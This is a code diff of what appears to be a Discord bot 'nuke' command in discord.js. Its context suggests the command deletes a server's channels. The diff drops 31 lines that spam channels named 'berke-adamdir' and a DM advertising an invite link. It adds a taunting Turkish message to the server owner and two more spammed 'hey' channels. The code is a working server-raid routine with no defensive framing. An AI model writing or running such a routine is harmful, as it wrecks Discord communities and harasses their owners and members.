@@ -37,38 +37,9 @@ return c.delete();
     
 
   
-message.guild.owner.send(`Yeni Discord ** https://discord.gg/w8Xq9bm **`);
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
-message.guild.createChannel(`berke-adamdir `)
+message.guild.owner.send(`Buraya ne oldu yahu? neyse yapanlara görüşmek istersen; `);
+message.guild.createChannel(`hey `)
+message.guild.createChannel(`hey `)
 message.delete()
 }
 };
